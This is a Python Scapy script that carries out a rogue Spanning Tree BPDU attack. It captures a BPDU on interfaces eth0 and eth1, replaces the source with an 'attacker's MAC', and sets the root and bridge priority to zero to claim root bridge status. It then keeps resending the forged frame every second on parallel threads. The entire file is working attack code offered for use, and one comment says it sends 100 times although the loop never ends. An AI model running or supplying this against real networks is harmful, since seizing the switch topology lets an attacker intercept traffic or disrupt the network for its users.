from scapy.all import *
import threading
import time

# Function to sniff, modify, and send BPDU packets on a specific interface
def send_bpdu(interface):
    # Sniff BPDU packet with the multicast destination MAC 01:80:C2:00:00:00
    pkt = sniff(filter="ether dst 01:80:c2:00:00:00", iface=interface, count=1)

    # Modify the BPDU packet (source MAC, root bridge ID, etc.)
    pkt[0].src = "00:05:1b:c2:ee:1d"  # Attacker's MAC address
    pkt[0].rootid = 0  # Set root bridge ID (Priority)
    pkt[0].rootmac = "00:00:00:00:00:01"  # Set root bridge MAC
    pkt[0].bridgeid = 0  # Set bridge ID (Priority)
    pkt[0].bridgemac = "00:00:00:00:00:01"  # Set bridge MAC

    # Show modified packet
    pkt[0].show()

    # Send the modified packet in a loop (rogue BPDU attack)
    while True:  # Send the packet 100 times
        sendp(pkt[0], iface=interface, loop=0, verbose=1)
        time.sleep(1)  # Wait 1 second between each packet

# Function to run BPDU sending on multiple interfaces concurrently
def send_bpdu_on_multiple_interfaces(interfaces):
    threads = []

    # Create a thread for each interface
    for interface in interfaces:
        thread = threading.Thread(target=send_bpdu, args=(interface,))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish (infinite loop so this will keep running)
    for thread in threads:
        thread.join()

# Example usage
if __name__ == "__main__":
    # List of interfaces (e.g., 'eth0' and 'eth1')
    interfaces = ['eth0', 'eth1']

    # Call the function to send BPDU packets on both interfaces
    send_bpdu_on_multiple_interfaces(interfaces)
